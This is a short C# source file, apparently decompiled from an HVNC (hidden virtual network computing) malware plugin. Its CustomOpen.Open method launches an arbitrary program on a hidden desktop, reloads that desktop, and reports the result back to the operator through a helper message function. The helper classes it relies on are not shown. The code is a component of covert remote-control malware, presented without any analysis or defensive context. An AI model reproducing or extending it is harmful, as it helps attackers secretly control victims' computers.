#define DEBUG
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using HVNC;

namespace S.OpenApp;

internal class CustomOpen
{
	public static void Open(string Filename, string Args)
	{
		try
		{
			if (!File.Exists(Filename))
			{
				HVNC.Plugin.Helper.SendMSG("CustomOpen: Not Found! ''" + Filename + "''");
				return;
			}
			HideDesktop.CreateProcess(Filename + " " + Args, HVNC.Plugin.Helper.NameDesktop, bAppName: false);
			Debug.WriteLine("Running.////");
			HVNC.Plugin.Helper.SendMSG(Filename + " : Running");
			Thread.Sleep(3000);
			HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
			Debug.WriteLine("Refresh");
		}
		catch (Exception ex)
		{
			HVNC.Plugin.Helper.SendMSG("CustomOpen: " + ex.Message);
		}
	}
}
